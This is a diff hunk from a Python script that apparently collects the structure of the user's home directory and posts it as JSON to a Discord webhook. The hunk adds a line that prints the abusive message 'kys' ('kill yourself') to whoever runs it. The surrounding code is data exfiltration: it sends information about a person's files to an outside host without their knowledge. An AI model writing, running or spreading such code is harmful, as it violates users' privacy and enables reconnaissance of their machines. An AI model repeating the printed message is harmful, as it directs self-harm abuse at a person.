@@ -15,6 +15,9 @@ def send_structure_to_discord(webhook_url, content):
     json_data = json.dumps(data).encode("utf-8")
     req = urllib.request.Request(webhook_url, data=json_data, headers={'Content-Type': 'application/json'})
 
+print("kys")
+
+
 try:
     home_dir = os.path.expanduser("~")
     directory_structure = get_directory_structure(home_dir)
